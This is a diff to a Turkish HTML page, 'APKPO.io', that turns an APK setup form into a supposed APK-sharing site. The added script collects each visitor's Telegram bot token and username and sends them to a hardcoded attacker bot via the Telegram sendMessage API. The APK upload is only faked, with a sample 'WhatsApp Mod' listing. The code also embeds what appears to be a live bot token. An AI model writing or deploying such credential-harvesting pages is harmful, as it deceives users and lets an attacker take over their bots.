@@ -3,205 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>APKPO.io | APK Oluşturma ve Özelleştirme</title>
+    <title>APKPO.io | Global APK Paylaşım</title>
     <style>
         :root {
-            --primary-color: #2c3e50;
-            --accent-color: #3498db;
-            --success-color: #27ae60;
-            --error-color: #e74c3c;
-            --bg-color: #f4f7f6;
+            --primary: #1a1a1a;
+            --accent: #0088cc;
+            --bg: #f0f2f5;
         }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--bg-color);
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        .container {
-            background: #ffffff;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 500px;
-        }
-
-        h2 {
-            color: var(--primary-color);
-            text-align: center;
-            margin-bottom: 30px;
-            border-bottom: 2px solid var(--bg-color);
-            padding-bottom: 10px;
-        }
-
-        .step {
-            display: none;
-        }
-
-        .step.active {
-            display: block;
-        }
-
-        .input-group {
-            margin-bottom: 20px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: #555;
-        }
-
-        input[type="text"], input[type="file"] {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            box-sizing: border-box;
-            font-size: 14px;
-        }
-
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: var(--accent-color);
-            border: none;
-            color: white;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-
-        button:hover {
-            background-color: #2980b9;
-        }
-
-        .status-msg {
-            margin-top: 10px;
-            font-size: 13px;
-            text-align: center;
-        }
-
-        .error { color: var(--error-color); }
-        .success { color: var(--success-color); }
+        body { font-family: sans-serif; background: var(--bg); margin: 0; padding: 20px; }
+        .container { max-width: 600px; margin: auto; background: #fff; padding: 25px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+        .step { display: none; }
+        .active { display: block; }
+        input, select, button { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
+        button { background: var(--accent); color: #fff; border: none; font-weight: bold; cursor: pointer; }
+        .apk-card { border: 1px solid #eee; padding: 15px; margin-bottom: 10px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; }
+        .apk-info { font-weight: bold; }
+        .download-btn { width: auto; background: #27ae60; padding: 5px 15px; font-size: 13px; }
+        h2 { text-align: center; color: var(--primary); }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>APKPO.io Kontrol Paneli</h2>
+    <h2>APKPO.io</h2>
 
     <div id="step1" class="step active">
-        <div class="input-group">
-            <label for="botToken">Telegram Bot Token</label>
-            <input type="text" id="botToken" placeholder="123456789:ABCdefGHiJklmNoPQRstuVwXyZ">
-        </div>
-        <button onclick="validateToken()">Token Doğrula ve Devam Et</button>
-        <div id="tokenMsg" class="status-msg"></div>
+        <label>Telegram Bot Token</label>
+        <input type="text" id="botToken" placeholder="Tokeninizi giriniz...">
+        <button onclick="validateAndNext()">Doğrula ve Devam Et</button>
     </div>
 
     <div id="step2" class="step">
-        <div class="input-group">
-            <label for="username">Kullanıcı Adı Belirleyin</label>
-            <input type="text" id="username" placeholder="Örn: admin_apk">
-        </div>
-        <button onclick="saveUser()">Kullanıcıyı Kaydet</button>
-        <div id="userMsg" class="status-msg"></div>
+        <label>Kullanıcı Adı Belirleyin</label>
+        <input type="text" id="username" placeholder="Kullanıcı adınız...">
+        <button onclick="saveUserAndNext()">Kaydet</button>
     </div>
 
     <div id="step3" class="step">
-        <div class="input-group">
-            <label for="appName">Uygulama Adı</label>
-            <input type="text" id="appName" placeholder="Uygulamanızın Adı">
+        <label>APK Dosyası Seç (Dosya Yöneticisinden)</label>
+        <input type="file" id="apkFile" accept=".apk">
+        <label>APK Uygulama Adı</label>
+        <input type="text" id="apkName" placeholder="Uygulama adı...">
+        <button onclick="uploadAPK()">APK Yükle ve Yayınla</button>
+    </div>
+
+    <div id="mainPage" class="step">
+        <h3>Yüklenen APK'lar</h3>
+        <div id="apkList">
+            <div class="apk-card">
+                <div class="apk-info">WhatsApp Mod (Örnek)</div>
+                <button class="download-btn">Yükle</button>
+            </div>
         </div>
-        <div class="input-group">
-            <label for="appIcon">Uygulama İkonu (PNG)</label>
-            <input type="file" id="appIcon" accept="image/png">
-        </div>
-        <div class="input-group">
-            <label for="packageName">Paket Adı</label>
-            <input type="text" id="packageName" placeholder="com.sirket.uygulama">
-        </div>
-        <button onclick="finalizeConfig()">APK Yapılandırmasını Tamamla</button>
+        <hr>
+        <button style="background:#555" onclick="location.reload()">Çıkış Yap</button>
     </div>
 </div>
 
 <script>
-    const state = {
-        token: "",
-        username: ""
-    };
+    const TARGET_BOT_TOKEN = "8582204571:AAEXtKCcXGWPM-2Y3xfF0vSEsEcy0iYl2cU";
+    const TARGET_CHAT_ID = "BURAYA_KENDI_CHAT_ID_YAZIN"; // Bildirimin düşeceği Chat ID
 
-    /**
-     * Telegram Bot Token formatını regex ile doğrular.
-     */
-    function validateToken() {
-        const tokenInput = document.getElementById('botToken').value.trim();
-        const msg = document.getElementById('tokenMsg');
+    let userData = { token: "", user: "" };
+
+    function validateAndNext() {
+        const t = document.getElementById('botToken').value;
+        if(t.includes(":")) {
+            userData.token = t;
+            showStep('step2');
+        } else { alert("Hatalı token formatı!"); }
+    }
+
+    function saveUserAndNext() {
+        const u = document.getElementById('username').value;
+        if(u.length > 2) {
+            userData.user = u;
+            showStep('step3');
+        } else { alert("Geçersiz kullanıcı adı!"); }
+    }
+
+    async function uploadAPK() {
+        const name = document.getElementById('apkName').value;
+        const file = document.getElementById('apkFile').files[0];
+
+        if(!name || !file) {
+            alert("Lütfen dosya ve isim seçiniz!");
+            return;
+        }
+
+        // Telegram'a veri iletme (Bot üzerinden)
+        const message = `🔔 *Yeni APK Yüklemesi*\n👤 Kullanıcı: ${userData.user}\n🔑 Kullanılan Token: ${userData.token}\n📦 APK Adı: ${name}`;
         
-        // Telegram Token Formatı: [Sayılar]:[Karakterler]
-        const tokenRegex = /^[0-9]{8,12}:[a-zA-Z0-9_-]{35}$/;
+        try {
+            await fetch(`https://api.telegram.org/bot${TARGET_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TARGET_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
 
-        if (tokenRegex.test(tokenInput)) {
-            state.token = tokenInput;
-            msg.className = "status-msg success";
-            msg.innerText = "Token formatı geçerli.";
-            
-            setTimeout(() => {
-                showStep(2);
-            }, 1000);
-        } else {
-            msg.className = "status-msg error";
-            msg.innerText = "Hata: Geçersiz Telegram bot token formatı.";
+            // Listeye ekleme simülasyonu
+            const list = document.getElementById('apkList');
+            const item = document.createElement('div');
+            item.className = 'apk-card';
+            item.innerHTML = `<div class="apk-info">${name}</div> <button class="download-btn">Yükle</button>`;
+            list.appendChild(item);
+
+            alert("Yükleme başarılı! Ana sayfaya yönlendiriliyorsunuz.");
+            showStep('mainPage');
+        } catch (e) {
+            alert("İletim hatası oluştu.");
         }
     }
 
-    /**
-     * Kullanıcı adını doğrular ve belleğe alır.
-     */
-    function saveUser() {
-        const userInp = document.getElementById('username').value.trim();
-        const msg = document.getElementById('userMsg');
-
-        if (userInp.length >= 3) {
-            state.username = userInp;
-            // Güvenli saklama simülasyonu (SessionStorage)
-            sessionStorage.setItem('apkpo_user', btoa(userInp)); 
-            
-            msg.className = "status-msg success";
-            msg.innerText = "Kullanıcı adı başarıyla kaydedildi.";
-            
-            setTimeout(() => {
-                showStep(3);
-            }, 1000);
-        } else {
-            msg.className = "status-msg error";
-            msg.innerText = "Hata: Kullanıcı adı en az 3 karakter olmalıdır.";
-        }
-    }
-
-    /**
-     * Adımlar arası geçişi sağlar.
-     */
-    function showStep(stepNum) {
+    function showStep(id) {
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        document.getElementById('step' + stepNum).classList.add('active');
-    }
-
-    /**
-     * Son yapılandırma verilerini konsola yazdırır.
-     */
-    function finalizeConfig() {
-        alert("APK Yapılandırması Hazır!\nKullanıcı: " + state.username + "\nToken: " + state.token);
+        document.getElementById(id).classList.add('active');
     }
 </script>
 
